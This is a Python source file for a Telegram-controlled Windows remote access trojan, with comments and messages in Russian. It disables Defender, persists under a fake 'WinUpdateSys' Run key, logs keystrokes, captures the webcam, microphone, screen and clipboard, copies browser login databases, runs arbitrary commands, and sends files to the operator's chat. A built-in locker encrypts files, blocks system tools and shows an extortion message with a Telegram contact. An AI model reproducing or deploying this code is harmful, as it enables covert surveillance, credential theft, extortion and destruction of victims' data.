# language: Python, file: main.py
import os
import sys
import time
import subprocess
import ctypes
import telebot
from telebot import types
import psutil
import cv2
import pyautogui
import keyboard
import win32clipboard
import winreg
import shutil
import base64
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
import webbrowser
import threading
import tkinter as tk
import winsound
from PIL import Image, ImageTk
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "ТВОЙ_ТОКЕН"
ADMIN_ID = 123456789
bot = telebot.TeleBot(BOT_TOKEN)
current_dir = os.getcwd()

# ================= ОБХОД =================
def bypass_uac_and_defender():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        except: pass
    try:
        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", 
                        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;"
                        "Add-MpPreference -ExclusionPath 'C:\\' -ErrorAction SilentlyContinue"],
                       capture_output=True, creationflags=0x08000000)
    except: pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinUpdateSys", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except: pass

def set_volume(level):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, 23, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevelScalar(level, None)
        return f"Громкость установлена на {int(level*100)}%"
    except Exception as e: return f"Ошибка: {e}"

# ================= RAT ФУНКЦИИ =================
def get_av_status():
    try:
        res = subprocess.run(["powershell", "-Command", "Get-MpComputerStatus | Select-Object -Property AntivirusEnabled, RealTimeProtectionEnabled"], capture_output=True, text=True)
        return res.stdout
    except: return "Ошибка проверки антивируса."

def take_screenshot():
    path = os.path.join(current_dir, "screen.png")
    pyautogui.screenshot(path)
    return path

def get_processes():
    return "\n".join([f"{p.pid} - {p.name()}" for p in psutil.process_iter()])

def webcam_photo():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    ret, frame = cap.read()
    cap.release()
    if ret:
        path = os.path.join(current_dir, "cam.jpg")
        cv2.imwrite(path, frame)
        return path
    return None

def get_full_process_report():
    rep = ""
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
        try:
            rep += f"PID: {p.info['pid']} | {p.info['name']} | CPU: {p.info['cpu_percent']}% | RAM: {p.info['memory_info'].rss // 1024 // 1024} MB\n"
        except: pass
    return rep

def kill_process(pid):
    try:
        psutil.Process(int(pid)).kill()
        return f"Процесс {pid} убит."
    except Exception as e: return str(e)

def create_folder(path):
    try:
        os.makedirs(path, exist_ok=True)
        return "Папка создана."
    except Exception as e: return str(e)

def delete_folder(path):
    try:
        shutil.rmtree(path, ignore_errors=True)
        return "Папка удалена."
    except Exception as e: return str(e)

def list_dir(path):
    try:
        return "\n".join(os.listdir(path))
    except Exception as e: return str(e)

def change_dir(path):
    global current_dir
    try:
        os.chdir(path)
        current_dir = os.getcwd()
        return f"Текущая директория: {current_dir}"
    except Exception as e: return str(e)

def get_sysinfo():
    return f"OS: {os.name}\nUser: {os.getlogin()}\nCPU: {psutil.cpu_percent()}%\nRAM: {psutil.virtual_memory().percent}%"

def show_msgbox(text):
    ctypes.windll.user32.MessageBoxW(0, text, "System Alert", 1)
    return "Окно показано."

def record_webcam(seconds=5):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return None
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('cam_vid.avi', fourcc, 20.0, (640, 480))
    start = time.time()
    while time.time() - start < seconds:
        ret, frame = cap.read()
        if ret: out.write(frame)
    cap.release()
    out.release()
    return 'cam_vid.avi'

def record_audio(seconds=5):
    fs = 44100
    rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    wav.write('audio.wav', fs, rec)
    return 'audio.wav'

def start_keylogger(seconds=10):
    log = []
    def on_press(event):
        log.append(event.name)
    keyboard.on_press(on_press)
    time.sleep(seconds)
    keyboard.unhook_all()
    return " ".join(log)

def open_file(path):
    try:
        os.startfile(path)
        return "Файл открыт."
    except Exception as e: return str(e)

def delete_file(path):
    try:
        os.remove(path)
        return "Файл удален."
    except Exception as e: return str(e)

def encrypt_file_func(path):
    try:
        key = Fernet.generate_key()
        f = Fernet(key)
        with open(path, "rb") as file:
            data = file.read()
        with open(path, "wb") as file:
            file.write(f.encrypt(data))
        return f"Зашифровано. Ключ: {key.decode()}"
    except Exception as e: return str(e)

def decrypt_file_func(path, key_str):
    try:
        f = Fernet(key_str.encode())
        with open(path, "rb") as file:
            data = file.read()
        with open(path, "wb") as file:
            file.write(f.decrypt(data))
        return "Расшифровано."
    except Exception as e: return str(e)

def alt_f4():
    keyboard.press_and_release('alt+f4')
    return "ALT+F4 нажат."

def minimize_all():
    keyboard.press_and_release('win+d')
    return "Свернуто."

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData()
        else:
            data = "[Не текст]"
        win32clipboard.CloseClipboard()
        return data
    except: return "Ошибка чтения."

def set_clipboard(text):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText(text)
    win32clipboard.CloseClipboard()
    return "Буфер обмена изменен."

def record_screen(seconds=5):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("screen_rec.avi", fourcc, 20.0, screen_size)
    start = time.time()
    while time.time() - start < seconds:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    return "screen_rec.avi"

def steal_browser_data():
    paths = [
        os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
    ]
    found = []
    for p in paths:
        if os.path.exists(p):
            try:
                shutil.copy(p, "stolen.db")
                found.append("stolen.db")
            except: pass
    return "\n".join(found) if found else "Ничего не найдено."

def kill_taskmgr():
    os.system("taskkill /f /im taskmgr.exe")
    return "Диспетчер задач закрыт."

def open_url(url):
    webbrowser.open(url)
    return "Ссылка открыта."

def cmd_bomb():
    for _ in range(10):
        subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
        time.sleep(0.1)
    return "CMD бомба запущена."

def shutdown_pc():
    os.system("shutdown /s /t 0")
    return "ПК выключается."

def reboot_pc():
    os.system("shutdown /r /t 0")
    return "ПК перезагружается."

def move_file(src, dst):
    try:
        shutil.move(src, dst)
        return "Файл перемещен."
    except Exception as e: return str(e)

def set_wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "Обои изменены."
    except Exception as e: return str(e)

def download_folder(folder_path):
    try:
        shutil.make_archive("folder_zip", 'zip', folder_path)
        return "folder_zip.zip"
    except Exception as e: return str(e)

def run_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return res.stdout + res.stderr
    except Exception as e: return str(e)

def self_destruct():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WinUpdateSys")
        winreg.CloseKey(key)
    except: pass
    os._exit(0)

# ================= ЛОКЕР (ВНУТРИ) =================
def run_locker_thread():
    CORRECT_CODE = "8841"
    BLOKC_EXE = ["notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe", "ProcessHacker.exe", "msconfig.exe", "iexplore.exe"]

    def encrypt_file(filepath, key, iv):
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            if not data: return
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            with open(filepath, "wb") as f:
                f.write(encrypted_data)
        except: pass

    def encrypt_directory():
        base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        target_dir = os.path.join(base_dir, "TestFolder")
        key_path = os.path.join(base_dir, "system_key.dat")
        if not os.path.exists(target_dir): return
        key = os.urandom(32)
        iv = os.urandom(16)
        with open(key_path, "wb") as f:
            f.write(key + iv)
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                if filepath.endswith(".locked"): continue
                encrypt_file(filepath, key, iv)

    def block_applications():
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() in BLOKC_EXE:
                    proc.kill()
            except: pass

    def start_blocking_loop():
        while True:
            block_applications()
            time.sleep(0.1)

    def resource_path(relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        full_path = os.path.join(base_path, relative_path)
        return full_path if os.path.exists(full_path) else None

    try:
        keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
        keyboard.add_hotkey('win+d', lambda: None, suppress=True)
        keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
        keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
        keyboard.block_key('win')
    except: pass

    threading.Thread(target=start_blocking_loop, daemon=True).start()

    win = tk.Tk()
    win.title('System Locker')
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            eye = Image.open(eye_path).resize((420, 200))
            eye_photo = ImageTk.PhotoImage(eye)
            eye_label = tk.Label(win, image=eye_photo, bg="#000000", bd=0)
            eye_label.image = eye_photo
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
        except:
            eye_label = tk.Label(win, text="[Eye Error]", fg="red", bg="black")
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
    else:
        eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
        eye_label.place(relx=0.5, rely=0.45, anchor="center")

    Text = "Booting System\n\nBoot Eror: x3131100\nBoot Eror: x3002123\nBoot Eror: x3001345\nBoot Eror: x011010001\nBoot Eror: x5111005\nBoot Eror: x00113210\n\nMemory section at adres 0x420 IS LOCKED!!"
    Text2 = "  WIN LOCKED ACTIVATE\n  CRYPTER starting..."
    
    label = tk.Label(win, text="", bg="#000000", fg="#FF0000", font=("Consolas", 15), anchor="w", justify="left")
    label.pack(pady=0, anchor="w", padx=0)
    
    label2 = tk.Label(win, text="", bg="#000000", fg="#656464", font=("Consolas", 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w", padx=0)

    i, i2 = 0, 0

    def typing():
        nonlocal i, i2
        if i <= len(Text):
            label.config(text=Text[:i])
            i += 1
            win.after(2, typing)
        elif i2 <= len(Text2):
            label2.config(text=Text2[:i2])
            i2 += 1
            win.after(2, typing)
        else:
            show_hacked_image()

    def show_hacked_image():
        label.pack_forget()
        label2.pack_forget()
        eye_label.place_forget()
        
        hacked_path = resource_path("assets/IMG_9170.PNG")
        if hacked_path:
            try:
                hacked = Image.open(hacked_path).resize((1200, 1000))
                hacked_photo = ImageTk.PhotoImage(hacked)
                hacked_label = tk.Label(win, image=hacked_photo, bg="#000000", bd=0)
                hacked_label.image = hacked_photo
                hacked_label.place(relx=0.5, rely=0.5, anchor="center")
            except: pass
        win.after(3000, start_locker)

    def start_locker():
        for widget in win.winfo_children():
            widget.destroy()
        try:
            sound_path = resource_path("scream.mp3")
            if sound_path:
                winsound.PlaySound(sound_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except: pass

        threading.Thread(target=encrypt_directory, daemon=True).start()

        ss_path = resource_path("assets/s.png")
        if ss_path:
            try:
                ss = Image.open(ss_path).resize((300, 300))
                win.photo = ImageTk.PhotoImage(ss)
                ss_label = tk.Label(win, image=win.photo, bg="#000000", bd=0)
                ss_label.place(x=50, y=450)
            except: pass

        title = tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!", fg="#4f4f4f", bg="#000000", font=("Consolas", 18))
        title.pack(pady=(50, 20))

        info = tk.Label(win, text=(
            "Ваш компьютер подвержен блокировке хакерской группой Qack.\n"
            "Любые попытки снять вирус приведут к поломке компьютера,\n"
            "так что не выебывайся ублюдок.\n\n"
            "За кодом писать @pu709 (Telegram)"
        ), fg="#AAAAAA", bg="#000000", font=("Consolas", 13), justify="center")
        info.pack(pady=20)

        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF", font=("Consolas", 16), justify="center", width=25)
        entry.pack(pady=10)

        result = tk.Label(win, text="Попыток осталось: 3", fg="#FF0000", bg="#000000", font=("Consolas", 12))
        result.pack(pady=5)
        
        attempts = 0

        def check_code():
            nonlocal attempts
            if entry.get() == CORRECT_CODE:
                result.config(text="Код правильный!", fg="#00FF00")
                win.after(1000, win.destroy)
                return
            attempts += 1
            entry.delete(0, tk.END)
            left = 3 - attempts
            if left > 0:
                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
            else:
                for widget in win.winfo_children():
                    widget.destroy()
                win.configure(bg="#FF0000")
                troll_label = tk.Label(win, text="ЕБАТЬ ТЫ ВЫБЛЯДОК ТУПОЙ", fg="#000000", bg="#FF0000", font=("Impact", 60), wraplength=1200)
                troll_label.pack(expand=True, fill="both")
                def kill_system():
                    try:
                        subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True, creationflags=0x08000000)
                        subprocess.run(["taskkill", "/f", "/im", "ctfmon.exe"], capture_output=True, creationflags=0x08000000)
                    except: pass
                threading.Thread(target=kill_system, daemon=True).start()

        button = tk.Button(win, text="ПРОВЕРИТЬ", command=check_code, bg="#222222", fg="#FFFFFF", font=("Consolas", 12), bd=0, padx=20, pady=8)
        button.pack(pady=10)
        entry.focus()

    typing()
    win.mainloop()

def start_locker_rat():
    threading.Thread(target=run_locker_thread, daemon=True).start()
    return "Локер запущен!"

# ================= МЕНЮ =================
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=3)
    btns = [
        types.InlineKeyboardButton("🛡️ Антивирус", callback_data='av'), types.InlineKeyboardButton("📸 Скриншот", callback_data='ss'),
        types.InlineKeyboardButton("🧠 Процессы", callback_data='proc'), types.InlineKeyboardButton("📷 Фото", callback_data='cam'),
        types.InlineKeyboardButton("📄 Отчет", callback_data='fullproc'), types.InlineKeyboardButton("❌ Убить", callback_data='killproc'),
        types.InlineKeyboardButton("📁 Создать папку", callback_data='mkdir'), types.InlineKeyboardButton("🗑️ Удалить папку", callback_data='rmdir'),
        types.InlineKeyboardButton("📂 Содержание", callback_data='ls'), types.InlineKeyboardButton("📌 Перейти", callback_data='cd'),
        types.InlineKeyboardButton("💻 Данные ПК", callback_data='sysinfo'), types.InlineKeyboardButton("💬 Окно", callback_data='msgbox'),
        types.InlineKeyboardButton("🎥 Запись видео", callback_data='vidcam'), types.InlineKeyboardButton("🎙️ Аудио", callback_data='audrec'),
        types.InlineKeyboardButton("⌨️ Кейлогер", callback_data='keylog'), types.InlineKeyboardButton("📄 Открыть файл", callback_data='openfile'),
        types.InlineKeyboardButton("⬆️ Загрузить", callback_data='upload'), types.InlineKeyboardButton("⬇️ Скачать", callback_data='download'),
        types.InlineKeyboardButton("🗑️ Удалить файл", callback_data='rmfile'), types.InlineKeyboardButton("🔐 Шифр", callback_data='enc'),
        types.InlineKeyboardButton("🔓 Расшифр", callback_data='dec'), types.InlineKeyboardButton("🔚 ALT+F4", callback_data='altf4'),
        types.InlineKeyboardButton("🗂️ Свернуть", callback_data='minall'), types.InlineKeyboardButton("📋 Буфер", callback_data='clipget'),
        types.InlineKeyboardButton("✏️ Изм. буфер", callback_data='clipset'), types.InlineKeyboardButton("🖥️ Запись экрана", callback_data='screenrec'),
        types.InlineKeyboardButton("🕵️ Стиллер", callback_data='steal'), types.InlineKeyboardButton("🧩 Закр. диспетчер", callback_data='killtm'),
        types.InlineKeyboardButton("🔗 Ссылка", callback_data='url'), types.InlineKeyboardButton("🔊 Вкл", callback_data='vol50'),
        types.InlineKeyboardButton("🔇 Выкл", callback_data='vol0'), types.InlineKeyboardButton("📢 100%", callback_data='vol100'),
        types.InlineKeyboardButton("💣 CMD", callback_data='cmdbomb'), types.InlineKeyboardButton("📴 Выкл ПК", callback_data='shutdown'),
        types.InlineKeyboardButton("🔄 Ребут", callback_data='reboot'), types.InlineKeyboardButton("🔀 Переместить", callback_data='move'),
        types.InlineKeyboardButton("🖼️ Обои", callback_data='wallpaper'), types.InlineKeyboardButton("📦 Скачать папку", callback_data='dlfolder'),
        types.InlineKeyboardButton("🧾 CMD", callback_data='cmd'), types.InlineKeyboardButton("💥 Суицид", callback_data='selfdestruct'),
        types.InlineKeyboardButton("🖥️ ЗАПУСТИТЬ ЛОКЕР", callback_data='run_locker')
    ]
    markup.add(*btns)
    bot.send_message(message.chat.id, "🖥 Панель управления:", reply_markup=markup)

# ================= ОБРАБОТЧИК =================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.from_user.id != ADMIN_ID: return
    bot.answer_callback_query(call.id)
    cmd = call.data
    chat = call.message.chat.id

    try:
        if cmd == 'av': bot.send_message(chat, get_av_status())
        elif cmd == 'ss':
            path = take_screenshot()
            with open(path, 'rb') as p: bot.send_photo(chat, p)
            os.remove(path)
        elif cmd == 'proc': bot.send_message(chat, get_processes()[:4000])
        elif cmd == 'cam':
            path = webcam_photo()
            if path:
                with open(path, 'rb') as p: bot.send_photo(chat, p)
                os.remove(path)
            else: bot.send_message(chat, "Камера недоступна.")
        elif cmd == 'fullproc': bot.send_message(chat, get_full_process_report()[:4000])
        elif cmd == 'killproc':
            bot.send_message(chat, "Введите PID:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, kill_process(m.text)))
        elif cmd == 'mkdir':
            bot.send_message(chat, "Введите путь папки:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, create_folder(m.text)))
        elif cmd == 'rmdir':
            bot.send_message(chat, "Введите путь папки:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, delete_folder(m.text)))
        elif cmd == 'ls':
            bot.send_message(chat, "Введите путь:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, list_dir(m.text)))
        elif cmd == 'cd':
            bot.send_message(chat, "Введите новый путь:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, change_dir(m.text)))
        elif cmd == 'sysinfo': bot.send_message(chat, get_sysinfo())
        elif cmd == 'msgbox':
            bot.send_message(chat, "Введите текст:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, show_msgbox(m.text)))
        elif cmd == 'vidcam':
            bot.send_message(chat, "Записываю 5 сек...")
            p = record_webcam(5)
            if p:
                with open(p, 'rb') as f: bot.send_video(chat, f)
                os.remove(p)
        elif cmd == 'audrec':
            bot.send_message(chat, "Записываю 5 сек...")
            p = record_audio(5)
            with open(p, 'rb') as f: bot.send_audio(chat, f)
            os.remove(p)
        elif cmd == 'keylog':
            bot.send_message(chat, "Слушаю 10 сек...")
            bot.send_message(chat, "Лог:\n" + start_keylogger(10))
        elif cmd == 'openfile':
            bot.send_message(chat, "Введите путь:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, open_file(m.text)))
        elif cmd == 'upload': bot.send_message(chat, "Отправьте файл.")
        elif cmd == 'download':
            bot.send_message(chat, "Введите путь файла:")
            bot.register_next_step_handler(call.message, lambda m: send_file_to_tg(bot, m, chat))
        elif cmd == 'rmfile':
            bot.send_message(chat, "Введите путь файла:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, delete_file(m.text)))
        elif cmd == 'enc':
            bot.send_message(chat, "Введите путь файла:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, encrypt_file_func(m.text)))
        elif cmd == 'dec':
            bot.send_message(chat, "Введите: ПУТЬ КЛЮЧ")
            bot.register_next_step_handler(call.message, lambda m: do_decrypt(m, chat))
        elif cmd == 'altf4': bot.send_message(chat, alt_f4())
        elif cmd == 'minall': bot.send_message(chat, minimize_all())
        elif cmd == 'clipget': bot.send_message(chat, get_clipboard())
        elif cmd == 'clipset':
            bot.send_message(chat, "Введите текст:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, set_clipboard(m.text)))
        elif cmd == 'screenrec':
            bot.send_message(chat, "Записываю 5 сек...")
            p = record_screen(5)
            with open(p, 'rb') as f: bot.send_video(chat, f)
            os.remove(p)
        elif cmd == 'steal': bot.send_message(chat, steal_browser_data())
        elif cmd == 'killtm': bot.send_message(chat, kill_taskmgr())
        elif cmd == 'url':
            bot.send_message(chat, "Введите URL:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, open_url(m.text)))
        elif cmd == 'vol50': bot.send_message(chat, set_volume(0.5))
        elif cmd == 'vol0': bot.send_message(chat, set_volume(0.0))
        elif cmd == 'vol100': bot.send_message(chat, set_volume(1.0))
        elif cmd == 'cmdbomb': bot.send_message(chat, cmd_bomb())
        elif cmd == 'shutdown': bot.send_message(chat, shutdown_pc())
        elif cmd == 'reboot': bot.send_message(chat, reboot_pc())
        elif cmd == 'move':
            bot.send_message(chat, "Введите откуда и куда через пробел:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, move_file(*m.text.split())))
        elif cmd == 'wallpaper':
            bot.send_message(chat, "Введите путь к картинке:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, set_wallpaper(m.text)))
        elif cmd == 'dlfolder':
            bot.send_message(chat, "Введите путь папки:")
            bot.register_next_step_handler(call.message, lambda m: send_folder_to_tg(bot, m, chat))
        elif cmd == 'cmd':
            bot.send_message(chat, "Введите команду CMD:")
            bot.register_next_step_handler(call.message, lambda m: bot.send_message(chat, run_cmd(m.text)))
        elif cmd == 'selfdestruct': bot.send_message(chat, "Самоуничтожение..."); self_destruct()
        elif cmd == 'run_locker': 
            bot.send_message(chat, "Запускаю локер...")
            bot.send_message(chat, start_locker_rat())
    except Exception as e:
        bot.send_message(chat, f"Ошибка: {e}")

# ================= ОТПРАВКА ФАЙЛОВ =================
def send_file_to_tg(bot, message, chat):
    path = message.text
    if os.path.exists(path):
        try:
            with open(path, 'rb') as f: bot.send_document(chat, f)
        except Exception as e: bot.send_message(chat, f"Ошибка: {e}")
    else: bot.send_message(chat, "Файл не найден.")

def send_folder_to_tg(bot, message, chat):
    folder = message.text
    if os.path.exists(folder):
        zip_path = download_folder(folder)
        with open(zip_path, 'rb') as f: bot.send_document(chat, f)
        os.remove(zip_path)
    else: bot.send_message(chat, "Папка не найдена.")

def do_decrypt(message, chat):
    parts = message.text.rsplit(' ', 1)
    if len(parts) == 2:
        bot.send_message(chat, decrypt_file_func(parts[0], parts[1]))
    else:
        bot.send_message(chat, "Введите: ПУТЬ КЛЮЧ")

# ================= ЗАПУСК =================
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(message.document.file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f"Сохранено: {message.document.file_name}")
    except Exception as e: bot.reply_to(message, f"Ошибка: {e}")

def main():
    bypass_uac_and_defender()
    bot.infinity_polling()

if __name__ == "__main__":
    main()
